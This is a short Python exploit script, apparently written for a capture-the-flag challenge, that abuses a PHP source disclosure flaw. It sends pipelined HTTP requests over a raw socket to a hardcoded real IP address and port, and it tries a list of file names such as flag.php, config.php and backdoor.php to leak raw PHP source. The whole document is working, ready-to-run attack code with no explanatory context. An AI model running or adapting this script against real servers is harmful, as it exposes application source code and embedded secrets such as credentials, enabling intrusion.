#!/usr/bin/env python3
import socket
import sys

def exploit(host, port, target_file):
    """
    Exploit the PHP source disclosure vulnerability.
    """
    payload = (
        f"GET /{target_file} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"\r\n"
        f"GET /xyz.xyz HTTP/1.1\r\n"
        f"\r\n"
    )
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        sock.send(payload.encode())
        
        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        
        sock.close()
        return response.decode('utf-8', errors='replace')
    except Exception as e:
        return f"Error: {e}"

host = "61.147.171.35"
port = 51810

# Files to try
files = [
    "index.php",
    "flag.php",
    "flag.txt",
    "config.php",
    "admin.php",
    "secret.php",
    "shell.php",
    "backdoor.php",
    "hidden.php",
    "s3Cr37_f1L3.php",
    ".flag",
    ".secret",
    "phpinfo.php",
    "info.php",
]

for f in files:
    result = exploit(host, port, f)
    # Check if it's a successful response with content
    if '<?php' in result or '404 Not Found' not in result:
        print(f"\n[+] {f}:")
        print(result[:500])
        print("-" * 50)
